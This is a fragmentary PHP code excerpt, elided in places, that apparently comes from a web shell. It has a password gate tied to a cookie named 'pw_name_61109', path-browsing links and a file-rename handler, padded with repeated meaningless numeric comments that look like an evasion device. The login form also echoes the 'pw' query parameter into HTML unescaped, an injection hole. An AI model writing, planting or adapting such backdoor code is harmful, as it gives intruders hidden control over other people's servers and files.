...
$pass = false;
if (isset($_COOKIE['pw_name_61109'])) {
    if(($_COOKIE['pw_name_61109']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_61109'])) {
        if(($_POST['pw_name_61109']) == $auth_key) {
            setcookie("pw_name_61109", $_POST['pw_name_61109']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_61109' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774828982 1724682774130692 1724682774776728 1724682774886252
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774828982 1724682774130692 1724682774776728 1724682774886252
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774828982 1724682774130692 1724682774776728 1724682774886252
            $name = PATH . "/" . $_GET['r'];
